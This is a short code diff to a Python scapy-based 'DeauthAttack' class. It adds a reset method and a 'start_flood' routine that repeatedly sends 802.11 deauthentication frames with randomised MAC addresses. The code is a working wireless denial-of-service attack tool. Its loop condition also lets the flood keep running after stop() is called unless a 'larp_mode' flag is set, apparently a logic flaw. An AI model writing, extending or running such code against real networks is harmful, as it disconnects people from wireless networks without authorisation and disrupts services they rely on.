@@ -9,7 +9,8 @@ class DeauthAttack:
         self._stop_event = threading.Event()
     def stop(self):
         self._stop_event.set()
-
+    def reset(self):
+        self._stop_event = threading.Event()
     def build_deauth_packet(self, client):
         packet = (scapy.RadioTap()/
                 scapy.Dot11(type=0, 
@@ -41,3 +42,13 @@ class DeauthAttack:
                         time.sleep(0.1)
                     except Exception as e:
                         time.sleep(0.1)
+
+    def start_flood(self):
+        while not self._stop_event.is_set() or not globals.larp_mode:
+            try:
+                globals.selected_bssid = scapy.RandMAC()
+                pkt = self.build_deauth_packet(scapy.RandMAC())
+                scapy.sendp(pkt, iface=self.IFACE, verbose=False)
+                time.sleep(0.1)
+            except Exception as e:
+                time.sleep(0.1)
